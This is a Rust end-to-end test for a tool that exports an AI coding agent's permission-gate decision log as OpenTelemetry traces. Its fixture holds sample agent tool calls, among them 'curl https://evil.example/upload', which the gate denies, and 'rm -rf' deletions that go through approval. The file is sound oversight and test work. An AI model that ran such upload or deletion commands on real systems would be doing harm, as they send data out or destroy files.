//! End-to-end test for `harness export-otlp` (AI2-66): a host decision log in
//! the D84 format goes in, OTLP/JSON traces come out — one trace per session,
//! one GenAI `execute_tool` span per decision, joined to its outcome.

use serde_json::{json, Value};
use std::path::Path;
use std::process::Command;

/// One session in the shape `cc-hook --log` writes it: an ALLOW that ran, an
/// ASK that ran (approved), an ASK with no outcome (declined), a DENY, and an
/// approved call that failed. Plus a second session and a console marker.
fn fixture() -> Vec<Value> {
    let d = |ts: u64, id: &str, tool: &str, call: &str, decision: &str, answer: Option<&str>| {
        let mut l = json!({"ts_ms": ts, "kind": "decision", "host": "claude-code",
            "session": "s1", "tool_use_id": id, "agent_id": null, "agent_type": null,
            "cwd": "/p", "tool": tool, "action": tool, "call": call, "decision": decision,
            "rule": null, "reason": "because", "answer": answer, "taint": "clean",
            "manifest_hash": "abc"});
        if answer == Some("ask") {
            l["human_answer"] = json!("inferred");
        }
        l
    };
    let o = |ts: u64, id: &str, status: &str, exit: Option<i64>, result: &str| {
        json!({"ts_ms": ts, "kind": "outcome", "event": "PostToolUse", "host": "claude-code",
            "session": "s1", "tool_use_id": id, "tool": "Bash", "ran": true,
            "status": status, "exit_code": exit, "error": null, "result": result,
            "duration_ms": 3})
    };
    let mut sub = d(1700, "t6", "Read", "/p/a.md", "ALLOW", None);
    sub["agent_id"] = json!("a-77");
    sub["agent_type"] = json!("Explore");
    vec![
        d(1000, "t1", "Read", "/p/README.md", "ALLOW", None),
        o(1010, "t1", "ok", None, r#"{"type":"text"}"#),
        d(1100, "t2", "Bash", "rm -rf build", "ASK", Some("ask")),
        o(1500, "t2", "ok", None, "no output"),
        d(1600, "t3", "Bash", "rm -rf dist", "ASK", Some("ask")),
        json!({"ts_ms": 1650, "kind": "policy", "headline": "Stop", "changes": []}),
        sub,
        o(1710, "t6", "ok", None, "<300 chars>"),
        d(
            1800,
            "t4",
            "Bash",
            "curl https://evil.example/upload",
            "DENY",
            Some("deny"),
        ),
        d(1900, "t5", "Bash", "cargo test", "ALLOW", None),
        json!({"ts_ms": 2400, "kind": "outcome", "event": "PostToolUseFailure",
            "host": "claude-code", "session": "s1", "tool_use_id": "t5", "tool": "Bash",
            "ran": true, "status": "error", "exit_code": 101,
            "error": "Exit code 101 test failed", "result": null}),
        json!({"ts_ms": 3000, "kind": "decision", "session": "s2", "tool_use_id": "u1",
            "tool": "WebFetch", "decision": "ALLOW", "answer": null, "call": "https://x"}),
    ]
}

fn export(log: &Path, extra: &[&str]) -> Value {
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["export-otlp", "--log"])
        .arg(log)
        .args(extra)
        .output()
        .expect("run export-otlp");
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let text = String::from_utf8(out.stdout).unwrap();
    assert_eq!(text.lines().count(), 1, "one request per line: {text}");
    serde_json::from_str(&text).expect("OTLP/JSON")
}

fn attr<'a>(span: &'a Value, key: &str) -> Option<&'a Value> {
    span["attributes"]
        .as_array()
        .unwrap()
        .iter()
        .find(|a| a["key"] == key)
        .map(|a| &a["value"])
}

fn s(span: &Value, key: &str) -> String {
    attr(span, key)
        .and_then(|v| v["stringValue"].as_str())
        .unwrap_or("")
        .to_string()
}

#[test]
fn a_session_becomes_one_trace_of_execute_tool_spans() {
    let dir = tempfile::tempdir().unwrap();
    let log = dir.path().join("decisions.jsonl");
    let text: Vec<String> = fixture().iter().map(Value::to_string).collect();
    std::fs::write(&log, text.join("\n") + "\nnot json\n").unwrap();

    let v = export(&log, &[]);
    let rs = &v["resourceSpans"][0];
    assert!(rs["resource"]["attributes"]
        .as_array()
        .unwrap()
        .iter()
        .any(|a| a["key"] == "service.name"));
    let spans = rs["scopeSpans"][0]["spans"].as_array().unwrap();
    // Seven decisions; outcome, policy and broken lines are not spans.
    assert_eq!(spans.len(), 7);
    let by_id = |id: &str| {
        spans
            .iter()
            .find(|sp| s(sp, "gen_ai.tool.call.id") == id)
            .unwrap_or_else(|| panic!("no span for {id}"))
    };

    // Every span is a GenAI execute_tool span.
    for sp in spans {
        assert_eq!(s(sp, "gen_ai.operation.name"), "execute_tool");
        assert_eq!(sp["kind"], 1, "INTERNAL");
        assert_eq!(
            sp["name"].as_str().unwrap(),
            format!("execute_tool {}", s(sp, "gen_ai.tool.name"))
        );
        assert_eq!(sp["traceId"].as_str().unwrap().len(), 32);
        assert_eq!(sp["spanId"].as_str().unwrap().len(), 16);
    }
    // One trace per session.
    let t1 = by_id("t1")["traceId"].clone();
    assert!(spans
        .iter()
        .filter(|sp| s(sp, "gen_ai.conversation.id") == "s1")
        .all(|sp| sp["traceId"] == t1));
    assert_ne!(by_id("u1")["traceId"], t1);

    // ALLOW that ran: OK, spans decision to outcome.
    let a = by_id("t1");
    assert_eq!(a["status"]["code"], 1);
    assert_eq!(a["startTimeUnixNano"], "1000000000");
    assert_eq!(a["endTimeUnixNano"], "1010000000");
    assert_eq!(a["events"].as_array().unwrap().len(), 2);

    // ASK, then it ran: approved, and labelled as inferred.
    let ask = by_id("t2");
    assert_eq!(s(ask, "ai2rules.human_answer"), "approved");
    assert_eq!(ask["status"]["code"], 1);
    assert_eq!(
        ask["events"][0]["attributes"][2]["value"]["stringValue"],
        "inferred"
    );

    // ASK with no outcome: declined or abandoned, not an error.
    let declined = by_id("t3");
    assert_eq!(
        s(declined, "ai2rules.human_answer"),
        "declined_or_abandoned"
    );
    assert_eq!(attr(declined, "ai2rules.ran").unwrap()["boolValue"], false);
    assert_eq!(declined["status"]["code"], 0);

    // DENY: an error the gate raised, with its reason.
    let deny = by_id("t4");
    assert_eq!(deny["status"]["code"], 2);
    assert_eq!(s(deny, "error.type"), "ai2rules.denied");
    assert_eq!(deny["status"]["message"], "because");

    // A call that ran and failed.
    let failed = by_id("t5");
    assert_eq!(failed["status"]["code"], 2);
    assert_eq!(s(failed, "error.type"), "tool_error");
    assert_eq!(
        attr(failed, "ai2rules.exit_code").unwrap()["intValue"],
        "101"
    );

    // A subagent's call names the agent.
    let sub = by_id("t6");
    assert_eq!(s(sub, "gen_ai.agent.name"), "Explore");
    assert_eq!(s(sub, "ai2rules.agent_id"), "a-77");

    // Summaries are opt-in.
    assert!(spans
        .iter()
        .all(|sp| attr(sp, "ai2rules.call").is_none() && attr(sp, "ai2rules.result").is_none()));

    // The same log always gives the same ids.
    assert_eq!(export(&log, &[]), v);
}

#[test]
fn summaries_are_exported_only_when_asked_and_out_writes_a_file() {
    let dir = tempfile::tempdir().unwrap();
    let log = dir.path().join("decisions.jsonl");
    let text: Vec<String> = fixture().iter().map(Value::to_string).collect();
    std::fs::write(&log, text.join("\n")).unwrap();

    let v = export(&log, &["--with-summaries"]);
    let spans = v["resourceSpans"][0]["scopeSpans"][0]["spans"]
        .as_array()
        .unwrap();
    let ask = spans
        .iter()
        .find(|sp| s(sp, "gen_ai.tool.call.id") == "t2")
        .unwrap();
    assert_eq!(s(ask, "ai2rules.call"), "rm -rf build");
    assert_eq!(s(ask, "ai2rules.result"), "no output");

    let out = dir.path().join("traces.json");
    let status = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["export-otlp", "--log"])
        .arg(&log)
        .arg("--out")
        .arg(&out)
        .status()
        .unwrap();
    assert!(status.success());
    let written: Value = serde_json::from_str(&std::fs::read_to_string(&out).unwrap()).unwrap();
    assert_eq!(written, export(&log, &[]));
}

#[test]
fn a_missing_log_is_a_clear_error() {
    let out = Command::new(env!("CARGO_BIN_EXE_harness"))
        .args(["export-otlp", "--log", "definitely-not-here.jsonl"])
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("cannot read"));
}
